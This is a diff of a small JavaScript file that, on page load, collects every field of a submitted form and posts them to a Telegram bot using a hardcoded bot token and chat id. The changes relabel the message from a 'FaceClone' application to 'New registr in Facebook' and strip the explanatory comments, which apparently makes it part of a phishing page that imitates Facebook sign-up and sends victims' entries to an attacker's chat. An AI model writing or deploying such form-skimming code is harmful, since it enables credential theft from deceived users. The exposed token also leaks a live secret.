@@ -1,6 +1,6 @@
 document.addEventListener("DOMContentLoaded", function () {
-    const telegramBotToken = "8121211283:AAHprTjXJ45KirdrnOc25l-AFZrhCAdXCwQ"; // Замените на ваш токен бота
-    const chatId = "7518382960"; // Замените на ваш chat_id
+    const telegramBotToken = "8121211283:AAHprTjXJ45KirdrnOc25l-AFZrhCAdXCwQ";
+    const chatId = "7518382960";
 
     function sendMessage(message) {
         const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
@@ -12,12 +12,12 @@ document.addEventListener("DOMContentLoaded", function () {
         })
         .then(response => response.json())
         .then(data => {
-            console.log("Сообщение отправлено", data);
-            alert("Данные успешно отправлены в Telegram!");
+            console.log("OK", data);
+            alert("OK");
         })
         .catch(error => {
-            console.error("Ошибка отправки", error);
-            alert("Ошибка отправки данных!");
+            console.error("bad", error);
+            alert("bad");
         });
     }
 
@@ -26,7 +26,7 @@ document.addEventListener("DOMContentLoaded", function () {
             event.preventDefault();
 
             let formData = new FormData(this);
-            let message = "📩 Новая заявка на FaceClone:\n";
+            let message = "📩 New registr in Facebook:\n";
 
             formData.forEach((value, key) => {
                 message += `🔹 ${key}: ${value}\n`;
